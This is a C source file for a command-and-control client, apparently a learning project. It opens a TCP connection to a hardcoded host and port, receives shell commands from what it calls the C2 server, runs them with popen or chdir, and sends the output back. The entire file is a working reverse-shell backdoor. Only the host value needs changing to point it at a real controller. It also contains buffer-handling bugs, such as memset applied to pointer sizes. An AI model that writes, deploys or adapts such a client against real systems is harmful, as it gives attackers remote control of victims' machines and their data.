// Standard library for Input/Output.
#include <stdio.h>
// Used to create the socket to connect with the client
#include <sys/socket.h>
// Standard library for string formatting
#include <string.h>
// Provides access to system functions
#include <unistd.h>
// Used to convert data between and network byte order
#include <arpa/inet.h>
// Used to interact with the system and execute commands
#include <stdlib.h>

// We'll define the IP address and the port where our client will stablish the connection to.
#define HOST "127.0.0.1"
#define PORT 6789

// This function is used to stablish connection with the server
int connectSocket(int sock) {
	// Defining the socket structure. Referenced in socket.1 manpages
	struct sockaddr_in serv;

	// I'll specify to the structure I'll use an IP connection
	serv.sin_family = AF_INET;

	// Specify the port the client will connect to, and below, the IP address
	serv.sin_port = htons(PORT);
	serv.sin_addr.s_addr = inet_addr(HOST);

	// Connecting to the C2 server
	int status_code = connect(sock, (struct sockaddr *)&serv, sizeof(serv));

	return status_code;
}

int getMessage(int sock, char* message) {
	// Referenced in recvmsg.1 and connect.1 manpages
	int stcode = recv(sock, message, 4096, 0);

	//If the message isn't received, return an error.
	if (stcode < 0) {
		return -1;
	}

	return stcode;
}

int execMessage(char* message, char* output, size_t output_len) {
	FILE* p;

	// Create a buffer to store the output information and append it to the 'output' variable
	char buf[256];

	// Execute the command and save the process inside a variable. If it cannot be executed, then store the following string in the variable. If the command starts with 'cd ', change the path to the specified location.
	if (strncmp(message, "cd ", 3) == 0) {
		memset(output, 0, sizeof(output));
		char *path = message + 3;

		if (chdir(path) == 0) {
			snprintf(output, output_len, "Directory changed.\n");
		} else {
			snprintf(output, output_len, "Failed to change directory.\n");
		}
		memset(message, 0, sizeof(message));
	} else {
		p = popen(message, "r");


		if (p == NULL) {
			strncpy(output, "Error on command execution", output_len);
        		return 1;
		}

		memset(message, 0, sizeof(message));
		memset(output, 0, sizeof(output));
		
		// Whenever the program outputs something, save it in 'buf' and append it to 'output' as long as it doesn't overflow the buffer.
		while (fgets(buf, sizeof(buf), p) != NULL) {
        		size_t out_used = strlen(output);

	        	// Stop concatenating if there's no space left (leave room for '\0')
		        if (out_used + 1 >= output_len) break;

			strncat(output, buf, output_len - out_used - 1);
		}

		pclose(p);

	}

	return 0;
}

ssize_t sendMessage(int sock, char* message) {
	// Referenced in recvmsg.1 and connect.1 manpages
	ssize_t msg_len = send(sock, message, strlen(message), 0);

	//If the message isn't sent, return an error.
	if (msg_len < 0) {
		return -1;
	}

	return msg_len;
}

int manage_msg(int s, char* msg) {
	//Keep the client running until no connection to the server is detected
	while (1) {
		int stcode_get = getMessage(s, msg);
		// Obtains the command from the C2 server

		if (stcode_get > 0) {
			char output[4096] = "No output retrieved";
			execMessage(msg, output, sizeof(output));
			sendMessage(s, output);
		} else if (stcode_get == 0) {
			return -1;
		}
	}

	return 0;
}

int main() {
	// Stablish a TCP/IP connection
	int s = socket(AF_INET, SOCK_STREAM, 0);

	// Buffer size, meaning, the amount of data that's going to be received
	char msg[4096] = {0};

	// Variable to check if the connection was successful
	int status_code = connectSocket(s);
	if (status_code != 0) {
		printf("Unable to connect to the server. Error code: %d\n", status_code);
		return 1;
	}

	manage_msg(s, msg);
	return 0;
}
